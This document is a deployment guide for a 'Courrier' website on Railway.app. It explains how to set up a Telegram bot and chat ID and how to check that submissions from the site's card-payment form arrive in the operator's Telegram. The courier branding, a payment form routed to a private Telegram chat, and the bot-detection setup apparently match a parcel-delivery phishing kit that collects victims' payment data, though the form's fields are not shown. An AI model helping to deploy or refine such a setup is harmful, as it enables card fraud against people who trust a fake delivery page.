# Railway Deployment Guide

This guide will help you deploy the Courrier website to Railway.app with Telegram integration.

## Prerequisites

1. GitHub account with this repository pushed
2. Railway.app account (sign up at https://railway.app)
3. Telegram Bot Token and Chat ID

## Getting Telegram Credentials

### Step 1: Create a Telegram Bot

1. Open Telegram and search for [@BotFather](https://t.me/botfather)
2. Send `/newbot` command
3. Follow the prompts to name your bot
4. Copy the **Bot Token** (looks like: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`)

### Step 2: Get Your Chat ID

**Option A: Using a Bot**
1. Search for [@userinfobot](https://t.me/userinfobot) on Telegram
2. Start the bot and it will show your Chat ID

**Option B: Manual Method**
1. Send a message to your bot (the one you created with BotFather)
2. Open this URL in your browser (replace `YOUR_BOT_TOKEN`):
   ```
   https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
   ```
3. Look for `"chat":{"id":` in the response - that number is your Chat ID

## Deploy to Railway

### Method 1: Deploy from GitHub (Recommended)

#### Step 1: Push to GitHub

Make sure all your code is committed and pushed:
```bash
git add .
git commit -m "Ready for Railway deployment"
git push origin main
```

#### Step 2: Create Railway Project

1. Go to [Railway.app](https://railway.app/new)
2. Click **"Start a New Project"**
3. Select **"Deploy from GitHub repo"**
4. Authorize Railway to access your GitHub account
5. Select the **Courrier** repository
6. Railway will automatically detect the project and start deploying

#### Step 3: Configure Environment Variables

1. In your Railway project dashboard, click on your service
2. Go to the **"Variables"** tab
3. Click **"+ New Variable"** and add these:

   ```
   TELEGRAM_BOT_TOKEN=your_bot_token_from_botfather
   TELEGRAM_CHAT_ID=your_chat_id_number
   NODE_ENV=production
   ```

4. Click **"Deploy"** or wait for automatic redeployment

#### Step 4: Get Your URL

1. Go to the **"Settings"** tab
2. Scroll to **"Networking"**
3. Click **"Generate Domain"**
4. Copy your public URL (e.g., `courrier-production.railway.app`)

#### Step 5: Test Your Deployment

1. Visit your Railway URL
2. Scroll down to the payment form
3. Check the "Pay by card" checkbox
4. Click "CONFIRM AND PROCEED TO PAYMENT"
5. Check your Telegram - you should receive a notification! 🎉

### Method 2: Deploy with Railway CLI

#### Step 1: Install Railway CLI

```bash
npm install -g @railway/cli
```

#### Step 2: Login

```bash
railway login
```

This will open a browser for authentication.

#### Step 3: Initialize Project

From your project directory:
```bash
railway init
```

Follow the prompts to create a new project.

#### Step 4: Set Environment Variables

```bash
railway variables set TELEGRAM_BOT_TOKEN=your_bot_token_here
railway variables set TELEGRAM_CHAT_ID=your_chat_id_here
railway variables set NODE_ENV=production
```

#### Step 5: Deploy

```bash
railway up
```

#### Step 6: Open Your App

```bash
railway open
```

## Verifying Deployment

### Check Deployment Logs

1. In Railway dashboard, click on your service
2. Go to **"Deployments"** tab
3. Click on the latest deployment
4. Check logs for:
   ```
   Server is running on port XXXX
   Environment: production
   Telegram bot: Enabled
   ```

### Test Form Submission

1. Visit your Railway URL
2. Open browser developer tools (F12)
3. Go to the Console tab
4. Fill out and submit the form
5. Check for errors in console
6. Verify you receive a Telegram notification

## Troubleshooting

### Issue: "Telegram bot: Disabled" in logs

**Solution:** Check that environment variables are set correctly:
- `TELEGRAM_BOT_TOKEN` should be set
- `TELEGRAM_CHAT_ID` should be set
- Redeploy after adding variables

### Issue: No Telegram notifications

**Checklist:**
- [ ] Bot token is correct (no extra spaces)
- [ ] Chat ID is correct (numeric value)
- [ ] You've sent at least one message to the bot
- [ ] Check Railway logs for error messages

### Issue: Form submission fails

**Common causes:**
- Rate limiting (wait 15 minutes and try again)
- Bot detection triggered (form submitted too quickly)
- JavaScript errors (check browser console)

### Issue: 404 errors on static files

**Solution:** 
- Verify all static files are in the repository
- Check that `server.js` has correct static file paths
- Clear browser cache and try again

## Custom Domain (Optional)

To use your own domain:

1. In Railway dashboard, go to **Settings** → **Networking**
2. Under **Custom Domains**, click **"+ Add Domain"**
3. Enter your domain name
4. Add the provided CNAME record to your DNS provider
5. Wait for DNS propagation (can take up to 48 hours)

## Monitoring & Maintenance

### View Logs

```bash
railway logs
```

### Check Resource Usage

Go to Railway dashboard → **Metrics** to see:
- CPU usage
- Memory usage
- Network traffic
- Request count

### Update Deployment

Any push to your GitHub repository will trigger an automatic deployment.

## Environment Variables Reference

| Variable | Required | Example | Description |
|----------|----------|---------|-------------|
| `TELEGRAM_BOT_TOKEN` | ✅ | `1234567890:ABC...` | Your bot token from BotFather |
| `TELEGRAM_CHAT_ID` | ✅ | `123456789` | Your Telegram chat ID |
| `NODE_ENV` | ❌ | `production` | Environment (auto-set by Railway) |
| `PORT` | ❌ | `3000` | Port number (auto-set by Railway) |
| `RATE_LIMIT_WINDOW_MS` | ❌ | `900000` | Rate limit window (15 min default) |
| `RATE_LIMIT_MAX_REQUESTS` | ❌ | `20` | Max form submissions per window per IP |

## Cost Information

Railway offers:
- **Hobby Plan**: $5/month for up to $5 of usage
- **Usage-based pricing**: Only pay for what you use
- **Free trial**: $5 of credit to start

This application typically uses minimal resources and should stay within the Hobby plan limits.

## Next Steps

- [ ] Set up a custom domain
- [ ] Configure additional security headers
- [ ] Set up monitoring alerts
- [ ] Add analytics tracking
- [ ] Customize Telegram message format

## Support

If you encounter issues:
1. Check Railway logs
2. Review this troubleshooting guide
3. Check [Railway documentation](https://docs.railway.app)
4. Open an issue on GitHub

---

**Deployment Complete! 🚀**

Your Courrier website is now live and will send form submissions to Telegram.
